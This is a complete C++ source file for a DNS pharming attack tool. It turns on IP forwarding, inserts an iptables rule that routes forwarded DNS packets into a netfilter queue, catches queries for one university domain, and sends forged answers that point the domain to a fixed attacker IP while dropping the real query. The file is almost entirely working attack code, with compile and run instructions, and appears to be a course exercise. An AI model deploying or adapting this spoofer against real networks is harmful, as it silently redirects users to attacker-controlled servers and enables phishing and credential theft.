// Compile with: g++ -Wall -Wextra -std=c++17 -o pharm_attack pharm_attack.cpp -lnetfilter_queue
// Run with: sudo ./pharm_attack
#include <iostream>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <arpa/inet.h>
#include <cstring>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

using namespace std;

#define ATTACK_SERVER_IP "140.113.24.241"
#define SPOOF_DOMAIN "www.nycu.edu.tw"

struct dnshdr {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

uint16_t checksum(uint16_t *buf, int nwords) {
    uint32_t sum = 0;
    for (; nwords > 0; nwords--) sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

static int cb(struct nfq_q_handle *qh, struct nfgenmsg *, struct nfq_data *nfa, void *) {
    // nfq_get_msg_packet_hdr(nfa):
    //    retrieves the packet header from the nfa which represents the packet intercepted by Netfilter
    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
    uint32_t id = ntohl(ph->packet_id);

    unsigned char *data;
    // this function extracts the actual packet payload from the nfa
    // data will point to the beginning of the packet
    // len will be the number of bytes in the payload
    int len = nfq_get_payload(nfa, &data);
    // if no payload was retrieved, the packet is let through normally
    if (len < 0){
        cout<<"there is no payload"<<endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
    }

    // if this IP packet does not contain a UDP payload, then
    // let the packet through untouched
    struct iphdr *ip = (struct iphdr *)data;
    if (ip->protocol != IPPROTO_UDP){
        cout<<"this is not the udp"<<endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
    }    

    // extracts the UDP header from the packet
    // ip->ihl*4 gives the length of the IP header in bytes
    struct udphdr *udp = (struct udphdr *)(data + ip->ihl * 4);
    int dns_offset = ip->ihl * 4 + sizeof(struct udphdr);
    dnshdr *dns = (dnshdr *)(data + dns_offset);

    char *query = (char *)(data + dns_offset + sizeof(dnshdr));
    std::string domain;
    int i = 0;
    while (query[i] != 0) {
        int len = query[i];
        domain.append(query + i + 1, len);
        i += len + 1;
        if (query[i] != 0) domain += ".";
    }

    //cout<<"domain: "<<domain<<endl;

    if (domain != SPOOF_DOMAIN) return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);

    cout << "Intercepted DNS Query for " << domain << endl;

    // Send spoofed response
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
    }

    char buffer[512] = {0};
    struct iphdr *spoof_ip = (struct iphdr *)buffer;
    struct udphdr *spoof_udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
    dnshdr *spoof_dns = (dnshdr *)(buffer + sizeof(struct iphdr) + sizeof(struct udphdr));
    char *dns_query = (char *)(buffer + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dnshdr));

    // Copy query
    memcpy(dns_query, query, i + 5);  // +5 includes qtype and qclass
    int query_len = i + 5;

    // Construct answer
    char *ans = dns_query + query_len;
    memcpy(ans, query, i + 1); // domain
    int ans_len = i + 1;

    ans[ans_len++] = 0x00; // Type A
    ans[ans_len++] = 0x01;
    ans[ans_len++] = 0x00; // Class IN
    ans[ans_len++] = 0x01;
    ans[ans_len++] = 0x00; // TTL
    ans[ans_len++] = 0x00;
    ans[ans_len++] = 0x00;
    ans[ans_len++] = 0x3c;
    ans[ans_len++] = 0x00; // Data length
    ans[ans_len++] = 0x04;

    in_addr addr;
    inet_aton(ATTACK_SERVER_IP, &addr);
    memcpy(ans + ans_len, &addr, 4);
    ans_len += 4;

    int total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dnshdr) + query_len + ans_len;

    // Fill DNS
    spoof_dns->id = dns->id;
    spoof_dns->flags = htons(0x8180); // Response
    spoof_dns->qdcount = htons(1);
    spoof_dns->ancount = htons(1);
    spoof_dns->nscount = 0;
    spoof_dns->arcount = 0;

    // UDP
    spoof_udp->source = udp->dest;
    spoof_udp->dest = udp->source;
    spoof_udp->len = htons(total_len - sizeof(struct iphdr));
    spoof_udp->check = 0;

    // IP
    spoof_ip->ihl = 5;
    spoof_ip->version = 4;
    spoof_ip->tos = 0;
    spoof_ip->tot_len = htons(total_len);
    spoof_ip->id = htons(0x1234);
    spoof_ip->frag_off = 0;
    spoof_ip->ttl = 64;
    spoof_ip->protocol = IPPROTO_UDP;
    spoof_ip->check = 0;
    spoof_ip->saddr = ip->daddr;
    spoof_ip->daddr = ip->saddr;
    spoof_ip->check = checksum((uint16_t *)spoof_ip, sizeof(struct iphdr) / 2);

    // Send
    struct sockaddr_in to;
    to.sin_family = AF_INET;
    to.sin_addr.s_addr = spoof_ip->daddr;
    if (sendto(sock, buffer, total_len, 0, (struct sockaddr *)&to, sizeof(to)) < 0) {
        perror("sendto");
    }
    close(sock);

    return nfq_set_verdict(qh, id, NF_DROP, 0, nullptr); // Drop original
}

int main() {

    system("sysctl -w net.ipv4.ip_forward=1");
    system("iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");

    struct nfq_handle *h;
    struct nfq_q_handle *qh;
    int fd;
    char buf[4096] __attribute__((aligned));
    h = nfq_open();
    nfq_unbind_pf(h, AF_INET);
    nfq_bind_pf(h, AF_INET);

    qh = nfq_create_queue(h, 0, &cb, nullptr);
    nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff);

    fd = nfq_fd(h);
    while (true) {
        int rv = recv(fd, buf, sizeof(buf), 0);
        if (rv >= 0) nfq_handle_packet(h, buf, rv);
    }

    nfq_destroy_queue(qh);
    nfq_close(h);
    return 0;
}